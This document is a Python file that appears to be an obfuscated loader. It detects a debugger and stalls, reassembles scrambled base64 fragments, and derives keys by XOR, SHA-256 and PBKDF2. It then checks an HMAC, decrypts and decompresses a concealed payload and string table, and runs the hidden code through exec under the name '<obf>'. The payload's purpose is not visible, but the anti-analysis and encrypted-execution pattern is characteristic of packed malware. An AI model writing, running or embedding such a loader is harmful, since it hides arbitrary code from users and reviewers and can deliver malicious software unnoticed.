import base64, zlib, json, hashlib, hmac, sys, time
import sys, time
tracef = getattr(sys, 'gettrace', None)
if tracef and tracef():
    time.sleep(5)
_048ac4_0 = 'ffhmFydmjBNathxSaHi8CFS7IaCUz0/U'
_048ac4_1 = 'RzNqYHK9zb3/1NVRT67kZ185B7y+rFvS4Lyn3ccpeYVznq3X'
_048ac4_2 = 'xiCkZaLC+FsfTg+6AgOdDJUW/lPOLw7A6tNgj/2C'
_048ac4_3 = 'm27rvIbp+WfpwGrENNDkdzMfeiV'
_048ac4_4 = '6iqF0X4AsY22MSLhb1smLDhpUZCqYf5wGzz6ws'
_048ac4_5 = 'e6t/zthAXu5SWc7/BjUCwyU+4Q3Re8wnbvQYEaR74+8MeN'
_048ac4_6 = 'da9jSNwExirVbp222fBIng2tD'
_048ac4_7 = 'a8HOIDbjwEgGsLESHNxcj2usggvh4GL5c+XV2+w7UKkmtWF9b4d'
_048ac4_8 = 'jFM+zPf0eVulNYHCzsSNcUmjkeIYuyqa8HP8Pc1qI446'
_048ac4_9 = 'DTTieePT+T8qvWZpbJCSyu6+7AjQRA4Y0pouxDUSrX0yZUOz/z'
_048ac4_10 = 'RdJsMV/nC5ZRLnfIHkPMTmEuVL5t92GKQZzIC6Lkh6EE5hcMvHVyjQwofeuH'
_048ac4_11 = 'IpXLJX5RaC8vwVTpYB3swL0Cbawefb1bUj0zerV7HbzlA0dEJpD/zId2'
_048ac4_12 = 'tw+6TBnN3kgOSjmbCEPzEqsgzoo'
_048ac4_13 = 'nCIsyLD1jeqtUSDhxn5mjXWriFKNV12UUmYtrPviEkX65yyq6FjRAmwq'
_048ac4_14 = 'dRSoz6c7hJYN8p21JGVB3+PleMqjk+akg3DHCa'
_048ac4_15 = 'ep2VDDuy9UxXxO1ks/GUZxOWg'
_048ac4_16 = 'RzeZOk8ZZhWDHCbY7OkmB1JyLgvLEbiXd3xw+'
_048ac4_17 = 'BFvPAtcccuAqliIFU6+rvBoqnukS1onFZ+6HeUZF'
_048ac4_18 = 'snzINAfiKk0hooV54kRY/xZAHGI3Mt1qK5HbRo0'
_048ac4_19 = 'MdOHXCA2IiLS4M3HdpN+hQNdbZo2Y2nLbOU'
_048ac4_20 = 'Z2Y+xhhgEz2ZSiFTc6j+9JiPoLL8ot3A7fwpGFM/CkA3vE'
_048ac4_21 = '3ovGoWTwpAa/orbEBJSAH58LAmmyFfJuaH'
_048ac4_22 = 'U5MinXagCrxVdkgWbMSikn/bik24c3lRIBSGn616czO4DrkYMhdrDH'
_048ac4_23 = 'ucT+Qor+O6uXTYz76yr8+OJRThCyRdRboMRcUfz62'
_048ac4_24 = '1jOnghQf4CGDGNS1RjnaKXJr5+2fqiRA4+'
_048ac4_25 = 'sWAnN3K5NG9dr4fLRc7L+KX6FfE9EOQg1tVHG6NxGNQB+jN'
_048ac4_26 = 'WcIWi8nIq1khsfzPkieHozyGJc4kBRkTWflswimaBF46MOnudf3t+9KtAP'
_048ac4_27 = '+'
_048ac4_28 = 'QjXVgmQhKZNwS4ALTqlv306LVwk3B2JsDY7bzNysK+H44FRe5/isBaoKCuN2V'
_048ac4_29 = 'erefoABPvJlwQGcBF7rIAb'
_pls = [_048ac4_0, _048ac4_1, _048ac4_2, _048ac4_3, _048ac4_4, _048ac4_5, _048ac4_6, _048ac4_7, _048ac4_8, _048ac4_9, _048ac4_10, _048ac4_11, _048ac4_12, _048ac4_13, _048ac4_14, _048ac4_15, _048ac4_16, _048ac4_17, _048ac4_18, _048ac4_19, _048ac4_20, _048ac4_21, _048ac4_22, _048ac4_23, _048ac4_24, _048ac4_25, _048ac4_26, _048ac4_27, _048ac4_28, _048ac4_29]
_203231 = [(3032,63141,2),(33112,58179,2),(39231,2140,2),(61995,49209,2),(25513,14028,2),(4229,10130,2),(64687,7259,2),(7076,4581,2),(4336,1347,2),(32550,57214,2),(55135,14429,2),(19989,51086,2),(10715,16909,2),(22695,16401,2),(10199,8387,2),(52942,57163,2),(0,0,0),(0,0,0)]
_3e38d1 = '/X1iGw=='
_3c4736 = 'QBn90Tny2/ttKCvo'
_7fa256 = 'vyagwGuu7s4='
_db78a8 = [20, 13, 10, 25, 7, 6, 21, 28, 27, 11, 24, 1, 12, 5, 9, 18, 19, 3, 4, 0, 14, 22, 23, 26, 16, 17, 8, 29, 15, 2]
_salt = base64.b64decode(_7fa256)
mhash = hashlib.sha256((__name__ + '|' + repr(globals().get('__file__',''))).encode('utf-8') + _salt).digest()
rbytes = list(mhash)
_perm = list(range(len(_pls)))
for _i in range(len(_perm)-1, 0, -1):
    _j = (rbytes[_i % len(rbytes)] + _i) % (_i + 1)
    _perm[_i], _perm[_j] = _perm[_j], _perm[_i]
_idxs = _db78a8
_assembled_list = []
_npls = len(_pls)
for _i in range(_npls):
    _pos = None
    try:
        _pos = _idxs.index(_i)
    except Exception:
        _pos = None
    if _pos is not None:
        _assembled_list.append(_pls[_pos])
_assembled = ''.join(_assembled_list)
_90a890 = base64.b64decode(_assembled)
_bd8c7d = 32
_cb0330 = _90a890[:-_bd8c7d]
_bd8c7d = _90a890[-_bd8c7d:]
_dee84b = (lambda P: b''.join(((v ^ m).to_bytes(l, 'big') for (v,m,l) in P if l)))(_203231)
_hdr = base64.b64decode(_3e38d1)
_nonce = base64.b64decode(_3c4736)
_km_seed = hashlib.sha256(_dee84b + _hdr + _nonce).digest()
_km = hashlib.pbkdf2_hmac('sha256', _km_seed, _nonce, 100000, dklen=32)
_blob_seed = hashlib.sha256(_km + b'blob').digest()
_blob_k = hashlib.pbkdf2_hmac('sha256', _blob_seed, _nonce, 20000, dklen=32)
_calc_tag = hmac.new(_blob_k, _cb0330, hashlib.sha256).digest()
if _calc_tag != _bd8c7d:
    raise RuntimeError('integrity check failed')
_bs = b''
_ctr = 0
_need = len(_cb0330)
while len(_bs) < _need:
    _bs += hashlib.sha256(_blob_k + _ctr.to_bytes(4, 'little')).digest()
    _ctr += 1
_raw = bytes(a ^ b for a, b in zip(_cb0330, _bs[:_need]))
_dec = zlib.decompress(_raw).decode('utf-8')
_J = json.loads(_dec)
mmap = {}
for _i, _enc in enumerate(_J['strs']):
    _c = base64.b64decode(_enc)
    _seed = hashlib.sha256(_km + b'str' + _i.to_bytes(4, 'little')).digest()
    _ks = b''
    _ctr = 0
    _need = len(_c)
    while len(_ks) < _need:
        _ks += hashlib.sha256(_seed + _ctr.to_bytes(4, 'little')).digest()
        _ctr += 1
    _pt = bytes(a ^ b for a, b in zip(_c, _ks[:_need]))
    mmap[str(_i)] = _pt.decode('utf-8')
globals()['_fb0e9d'] = mmap
globals()['_99ae49'] = lambda i: globals()['_fb0e9d'][str(i)]
_x = globals()['_99ae49']
exec(compile(_J['s'], '<obf>', 'exec'), globals())
